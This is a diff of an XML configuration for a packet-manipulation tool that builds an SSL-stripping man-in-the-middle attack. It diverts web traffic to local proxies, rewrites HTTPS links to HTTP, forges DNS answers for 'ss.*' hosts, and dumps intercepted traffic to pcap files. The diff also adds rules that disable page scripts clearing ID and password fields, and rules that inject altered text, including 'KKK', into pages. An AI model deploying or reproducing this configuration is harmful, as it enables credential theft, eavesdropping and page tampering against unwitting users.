@@ -1,12 +1,12 @@
 <sslstrip>
   <graph>
     <objectList>
-      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="(ifIdx!=1) and outbound and (tcp.DstPort==80 or tcp.DstPort==8080 or tcp.DstPort==8888 or tcp.DstPort==443 or tcp.DstPort==4433 or udp.DstPort==53)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdOutbound" flags="0"/>
-      <object snapLen="1600" autoRead="true" autoParse="true" _class="SnoopArpSpoof" filter="tcp dst port 80 or tcp dst port 8080 or tcp dst port 8888 or tcp dst port 443 or tcp dst port 4433" selfRelay="true" enabled="false" virtualMac="000000-000000" disableAutoRouting="true" readTimeout="1" adapterIndex="0" name="as" infectInterval="1000" flags="1">
+      <object tos="0" enabled="true" autoParse="true" name="wdOutbound" autoRead="true" flags="0" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="(ifIdx!=1) and outbound and (tcp.DstPort==80 or tcp.DstPort==8080 or tcp.DstPort==8888 or tcp.DstPort==443 or tcp.DstPort==4433 or udp.DstPort==53)" correctChecksum="true" priority="0"/>
+      <object infectInterval="1000" enabled="false" autoParse="true" adapterIndex="0" selfRelay="true" name="as" autoRead="true" flags="1" readTimeout="1" _class="SnoopArpSpoof" filter="tcp dst port 80 or tcp dst port 8080 or tcp dst port 8888 or tcp dst port 443 or tcp dst port 4433" snapLen="1600" virtualMac="000000-000000" disableAutoRouting="true">
         <sessionList/>
       </object>
-      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmOutboundProcessFilter" checkInterval="1" macFlowTimeout="3600"/>
-      <object _class="SnoopProcessFilter" flowMgr="fmOutboundProcessFilter" name="pfOutbound" showStatus="false">
+      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmOutboundProcessFilter" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
+      <object flowMgr="fmOutboundProcessFilter" showStatus="false" name="pfOutbound" _class="SnoopProcessFilter">
         <policies>
           <policy processName="" ack="false"/>
           <policy processName="chrome.exe" ack="false"/>
@@ -20,10 +20,10 @@
           <policy processName="svchost.exe" ack="false"/>
         </policies>
       </object>
-      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmOutbound" checkInterval="1" macFlowTimeout="3600"/>
-      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="(ifIdx==1) and (tcp.SrcPort=8079 or tcp.SrcPort=4432 or tcp.SrcPort=8042)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdInbound" flags="0"/>
-      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmInboundProcessFilter" checkInterval="1" macFlowTimeout="3600"/>
-      <object _class="SnoopProcessFilter" flowMgr="fmInboundProcessFilter" name="pfInbound" showStatus="false">
+      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmOutbound" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
+      <object tos="0" enabled="true" autoParse="true" name="wdInbound" autoRead="true" flags="0" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="(ifIdx==1) and (tcp.SrcPort=8079 or tcp.SrcPort=4432 or tcp.SrcPort=8042)" correctChecksum="true" priority="0"/>
+      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmInboundProcessFilter" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
+      <object flowMgr="fmInboundProcessFilter" showStatus="false" name="pfInbound" _class="SnoopProcessFilter">
         <policies>
           <policy processName="" ack="false"/>
           <policy processName="httpproxy.exe" ack="true"/>
@@ -32,127 +32,129 @@
           <policy processName="sscon.exe" ack="true"/>
         </policies>
       </object>
-      <object udpFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" ipFlowTimeout="300" name="fmInbound" checkInterval="1" macFlowTimeout="3600"/>
-      <object toFlowMgr="fmInbound" _class="SnoopFlowChange" fromFlowMgr="fmOutbound" tcpChange="true" udpChange="false" name="fc">
+      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmInbound" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
+      <object fromFlowMgr="fmOutbound" toFlowMgr="fmInbound" name="fc" tcpChange="true" udpChange="false" _class="SnoopFlowChange">
         <changeItems>
-          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="80" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
-          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="8080" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
-          <item log="true" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="80.43.80.43" dstPort="8888" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8042" dstIpFixValue="127.0.0.1"/>
-          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="80" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
-          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="8080" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
-          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="8888" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="8079" dstIpFixValue="127.0.0.1"/>
-          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="443" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="4432" dstIpFixValue="127.0.0.1"/>
-          <item log="false" srcIpFixValue="127.0.0.1" protocol="1" enabled="true" srcIpChangeType="1" dstIp="0.0.0.0" dstPort="4433" srcIp="0.0.0.0" srcPortChangeType="1" dstIpChangeType="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPort="0" srcPortFixValue="0" dstPortChangeType="2" dstPortFixValue="4432" dstIpFixValue="127.0.0.1"/>
+          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="80" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="8080" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="8888" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="80" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="8080" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="8888" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="443" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="4432" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
+          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="4433" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="4432" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
         </changeItems>
       </object>
-      <object layer="0" autoRead="false" autoParse="false" tos="0" correctChecksum="true" _class="SnoopWriteWinDivert" filter="true" changeDivertAddr="true" queueLen="8192" queueTime="1024" IfIdx="1" enabled="true" priority="0" SubIfIdx="0" name="wwdOutbound" Direction="0" flags="1"/>
-      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpTcpIn" sslEnabled="false">
-        <outPolicy port="8080" method="1" host="127.0.0.1"/>
-        <tcpServer onceWriteSize="0" port="8079" _class="VTcpServer" localHost="127.0.0.1"/>
-        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
+      <object Direction="0" tos="0" SubIfIdx="0" enabled="true" autoParse="false" name="wwdOutbound" changeDivertAddr="true" autoRead="false" flags="1" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWriteWinDivert" filter="true" correctChecksum="true" priority="0" IfIdx="1"/>
+      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpTcpIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="true">
+        <outPolicy host="127.0.0.1" port="8080" method="1"/>
+        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8079" _class="VTcpServer"/>
+        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange/>
         <outboundDataChange>
-          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
+          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
         </outboundDataChange>
       </object>
-      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpTcpOut" sslEnabled="false">
-        <outPolicy port="0" method="1" host=""/>
-        <tcpServer onceWriteSize="0" port="8080" _class="VTcpServer" localHost="127.0.0.1"/>
-        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
+      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpTcpOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
+        <outPolicy host="" port="0" method="1"/>
+        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8080" _class="VTcpServer"/>
+        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange>
-          <item cs="0" log="true" pattern="MIchael" minimal="false" syntax="2" enabled="true" replace="GILBERT"/>
-          <item cs="1" log="true" pattern="https://" minimal="false" syntax="2" enabled="true" replace="http://ss."/>
+          <item syntax="2" pattern="MIchael" cs="0" minimal="false" log="true" enabled="true" replace="GILBERT"/>
+          <item syntax="2" pattern="https://" cs="1" minimal="false" log="true" enabled="true" replace="http://ss."/>
+          <item syntax="2" pattern="$('id').value = &quot;&quot;;" cs="1" minimal="false" log="true" enabled="true" replace="// hacked id"/>
+          <item syntax="2" pattern="$('pw').value = &quot;&quot;;" cs="1" minimal="false" log="true" enabled="true" replace="// hacked pw"/>
         </inboundDataChange>
         <outboundDataChange/>
       </object>
-      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="false" name="hpSslIn" sslEnabled="true">
-        <outPolicy port="4433" method="1" host="127.0.0.1"/>
-        <tcpServer onceWriteSize="0" port="8080" _class="VTcpServer" localHost=""/>
-        <sslServer onceWriteSize="0" port="4432" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost="127.0.0.1"/>
+      <object maxContentCacheSize="10485756" sslEnabled="true" name="hpSslIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="false">
+        <outPolicy host="127.0.0.1" port="4433" method="1"/>
+        <tcpServer localHost="" onceWriteSize="0" port="8080" _class="VTcpServer"/>
+        <sslServer localHost="127.0.0.1" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4432" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange/>
         <outboundDataChange>
-          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
+          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
         </outboundDataChange>
       </object>
-      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpSslOut" sslEnabled="false">
-        <outPolicy port="0" method="2" host=""/>
-        <tcpServer onceWriteSize="0" port="4433" _class="VTcpServer" localHost="127.0.0.1"/>
-        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
+      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpSslOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
+        <outPolicy host="" port="0" method="2"/>
+        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="4433" _class="VTcpServer"/>
+        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange>
-          <item cs="1" log="true" pattern="Mark Zukerberg" minimal="false" syntax="2" enabled="true" replace="GILBERT LEE"/>
-          <item cs="1" log="true" pattern="Money for every moment." minimal="false" syntax="2" enabled="true" replace="KKK"/>
+          <item syntax="2" pattern="Mark Zukerberg" cs="1" minimal="false" log="true" enabled="true" replace="GILBERT LEE"/>
+          <item syntax="2" pattern="Money for every moment." cs="1" minimal="false" log="true" enabled="true" replace="KKK"/>
         </inboundDataChange>
         <outboundDataChange/>
       </object>
-      <object layer="0" autoRead="true" autoParse="true" tos="0" correctChecksum="true" _class="SnoopWinDivert" filter="ifIdx==1 and outbound and (tcp.SrcPort==8080 or tcp.DstPort==8080 or tcp.SrcPort==4433 or tcp.DstPort==4433 or tcp.SrcPort==8043 or tcp.DstPort==8043)" queueLen="8192" queueTime="1024" enabled="true" priority="0" name="wdProxy" flags="1"/>
-      <object _class="SnoopDump" filePath="pcap/httpsniff_%04d%02d%02d.%02d%02d.%02d.%03d.pcap" name="dProxy" linkType="1"/>
-      <object snapLen="1600" autoRead="false" autoParse="false" _class="SnoopWriteAdapter" filter="" enabled="true" readTimeout="1" adapterIndex="1" srcMac="000000-000000" name="waProxy" dstMac="000000-000000" flags="1"/>
-      <object _class="SnoopBpFilter" filter="udp dst port 53" name="BpFilter1" linkType="1"/>
-      <object _class="SnoopDnsChange" name="DnsChange1" capture="wdOutbound">
+      <object tos="0" enabled="true" autoParse="true" name="wdProxy" autoRead="true" flags="1" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="ifIdx==1 and outbound and (tcp.SrcPort==8080 or tcp.DstPort==8080 or tcp.SrcPort==4433 or tcp.DstPort==4433 or tcp.SrcPort==8043 or tcp.DstPort==8043)" correctChecksum="true" priority="0"/>
+      <object linkType="1" name="dProxy" filePath="pcap/httpsniff_%04d%02d%02d.%02d%02d.%02d.%03d.pcap" _class="SnoopDump"/>
+      <object enabled="true" autoParse="false" adapterIndex="1" srcMac="000000-000000" name="waProxy" dstMac="000000-000000" autoRead="false" flags="1" readTimeout="1" _class="SnoopWriteAdapter" filter="" snapLen="1600"/>
+      <object linkType="1" name="BpFilter1" _class="SnoopBpFilter" filter="udp dst port 53"/>
+      <object name="DnsChange1" capture="wdOutbound" _class="SnoopDnsChange">
         <changeItems>
-          <item cs="1" log="true" pattern="ss.*" minimal="false" syntax="1" enabled="true" ip="80.43.80.43"/>
+          <item syntax="1" pattern="ss.*" cs="1" minimal="false" log="true" enabled="true" ip="80.43.80.43"/>
         </changeItems>
       </object>
-      <object disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpStripIn" sslEnabled="true">
-        <outPolicy port="8043" method="1" host="127.0.0.1"/>
-        <tcpServer onceWriteSize="0" port="8042" _class="VTcpServer" localHost="127.0.0.1"/>
-        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
+      <object maxContentCacheSize="10485756" sslEnabled="true" name="hpStripIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="true">
+        <outPolicy host="127.0.0.1" port="8043" method="1"/>
+        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8042" _class="VTcpServer"/>
+        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange/>
         <outboundDataChange>
-          <item cs="1" log="false" pattern="Accept-Encoding: gzip," minimal="false" syntax="2" enabled="true" replace="Accept-Encoding:      "/>
-          <item cs="1" log="true" pattern="Host: ss." minimal="false" syntax="2" enabled="true" replace="Host: "/>
+          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
+          <item syntax="2" pattern="Host: ss." cs="1" minimal="false" log="true" enabled="true" replace="Host: "/>
         </outboundDataChange>
       </object>
-      <object disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" keepAliveTimeout="60000" maxContentCacheSize="10485756" tcpEnabled="true" name="hpStripOut" sslEnabled="false">
-        <outPolicy port="0" method="2" host=""/>
-        <tcpServer onceWriteSize="0" port="8043" _class="VTcpServer" localHost="127.0.0.1"/>
-        <sslServer onceWriteSize="0" port="4433" processConnectMessage="false" _class="VSslServer" certificatePath="certificate\" defaultKeyCrtFileName="default.pem" methodType="4" localHost=""/>
+      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpStripOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
+        <outPolicy host="" port="0" method="2"/>
+        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8043" _class="VTcpServer"/>
+        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
         <inboundDataChange>
-          <item cs="1" log="true" pattern="https://" minimal="false" syntax="2" enabled="true" replace="http://ss."/>
+          <item syntax="2" pattern="https://" cs="1" minimal="false" log="true" enabled="true" replace="http://ss."/>
         </inboundDataChange>
         <outboundDataChange/>
       </object>
     </objectList>
     <connectList>
-      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdOutbound" receiver="fmOutboundProcessFilter"/>
-      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="as" receiver="fmOutbound"/>
-      <connect slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmOutboundProcessFilter" receiver="pfOutbound"/>
-      <connect slot="process(SnoopPacket*)" signal="nak(SnoopPacket*)" sender="pfOutbound" receiver="fmOutbound"/>
-      <connect slot="processFromTo(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmOutbound" receiver="fc"/>
-      <connect slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdInbound" receiver="fmInboundProcessFilter"/>
-      <connect slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmInboundProcessFilter" receiver="pfInbound"/>
-      <connect slot="process(SnoopPacket*)" signal="ack(SnoopPacket*)" sender="pfInbound" receiver="fmInbound"/>
-      <connect slot="processToFrom(SnoopPacket*)" signal="processed(SnoopPacket*)" sender="fmInbound" receiver="fc"/>
-      <connect slot="move(SnoopPacket*)" signal="changedFromTo(SnoopPacket*)" sender="fc" receiver="wwdOutbound"/>
-      <connect slot="dump(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdProxy" receiver="dProxy"/>
-      <connect slot="copy(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdProxy" receiver="waProxy"/>
-      <connect slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="wdOutbound" receiver="BpFilter1"/>
-      <connect slot="check(SnoopPacket*)" signal="ack(SnoopPacket*)" sender="BpFilter1" receiver="DnsChange1"/>
-      <connect slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" sender="as" receiver="BpFilter1"/>
+      <connect signal="captured(SnoopPacket*)" receiver="fmOutboundProcessFilter" sender="wdOutbound" slot="process(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="fmOutbound" sender="as" slot="process(SnoopPacket*)"/>
+      <connect signal="processed(SnoopPacket*)" receiver="pfOutbound" sender="fmOutboundProcessFilter" slot="check(SnoopPacket*)"/>
+      <connect signal="nak(SnoopPacket*)" receiver="fmOutbound" sender="pfOutbound" slot="process(SnoopPacket*)"/>
+      <connect signal="processed(SnoopPacket*)" receiver="fc" sender="fmOutbound" slot="processFromTo(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="fmInboundProcessFilter" sender="wdInbound" slot="process(SnoopPacket*)"/>
+      <connect signal="processed(SnoopPacket*)" receiver="pfInbound" sender="fmInboundProcessFilter" slot="check(SnoopPacket*)"/>
+      <connect signal="ack(SnoopPacket*)" receiver="fmInbound" sender="pfInbound" slot="process(SnoopPacket*)"/>
+      <connect signal="processed(SnoopPacket*)" receiver="fc" sender="fmInbound" slot="processToFrom(SnoopPacket*)"/>
+      <connect signal="changedFromTo(SnoopPacket*)" receiver="wwdOutbound" sender="fc" slot="move(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="dProxy" sender="wdProxy" slot="dump(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="waProxy" sender="wdProxy" slot="copy(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="BpFilter1" sender="wdOutbound" slot="check(SnoopPacket*)"/>
+      <connect signal="ack(SnoopPacket*)" receiver="DnsChange1" sender="BpFilter1" slot="check(SnoopPacket*)"/>
+      <connect signal="captured(SnoopPacket*)" receiver="BpFilter1" sender="as" slot="check(SnoopPacket*)"/>
     </connectList>
   </graph>
   <coord>
-    <object x="-165" y="-115" name="wdOutbound"/>
-    <object x="-258" y="-119" name="as"/>
-    <object x="-202" y="-77" name="fmOutboundProcessFilter"/>
-    <object x="-164" y="-38" name="pfOutbound"/>
-    <object x="-165" y="2" name="fmOutbound"/>
-    <object x="3" y="-115" name="wdInbound"/>
-    <object x="-36" y="-76" name="fmInboundProcessFilter"/>
-    <object x="2" y="-39" name="pfInbound"/>
-    <object x="-1" y="1" name="fmInbound"/>
-    <object x="-55" y="36" name="fc"/>
-    <object x="-175" y="74" name="wwdOutbound"/>
-    <object x="-154" y="116" name="hpTcpIn"/>
-    <object x="-160" y="154" name="hpTcpOut"/>
-    <object x="12" y="115" name="hpSslIn"/>
-    <object x="5" y="149" name="hpSslOut"/>
-    <object x="-130" y="224" name="wdProxy"/>
-    <object x="6" y="199" name="dProxy"/>
-    <object x="6" y="238" name="waProxy"/>
-    <object x="-302" y="-69" name="BpFilter1"/>
-    <object x="-312" y="-27" name="DnsChange1"/>
-    <object x="-277" y="117" name="hpStripIn"/>
-    <object x="-278" y="156" name="hpStripOut"/>
+    <object x="-165" name="wdOutbound" y="-115"/>
+    <object x="-258" name="as" y="-119"/>
+    <object x="-202" name="fmOutboundProcessFilter" y="-77"/>
+    <object x="-164" name="pfOutbound" y="-38"/>
+    <object x="-165" name="fmOutbound" y="2"/>
+    <object x="3" name="wdInbound" y="-115"/>
+    <object x="-36" name="fmInboundProcessFilter" y="-76"/>
+    <object x="2" name="pfInbound" y="-39"/>
+    <object x="-1" name="fmInbound" y="1"/>
+    <object x="-55" name="fc" y="36"/>
+    <object x="-175" name="wwdOutbound" y="74"/>
+    <object x="-154" name="hpTcpIn" y="116"/>
+    <object x="-160" name="hpTcpOut" y="154"/>
+    <object x="12" name="hpSslIn" y="115"/>
+    <object x="5" name="hpSslOut" y="149"/>
+    <object x="-130" name="wdProxy" y="224"/>
+    <object x="6" name="dProxy" y="199"/>
+    <object x="6" name="waProxy" y="238"/>
+    <object x="-302" name="BpFilter1" y="-69"/>
+    <object x="-312" name="DnsChange1" y="-27"/>
+    <object x="-277" name="hpStripIn" y="117"/>
+    <object x="-278" name="hpStripOut" y="156"/>
   </coord>
 </sslstrip>
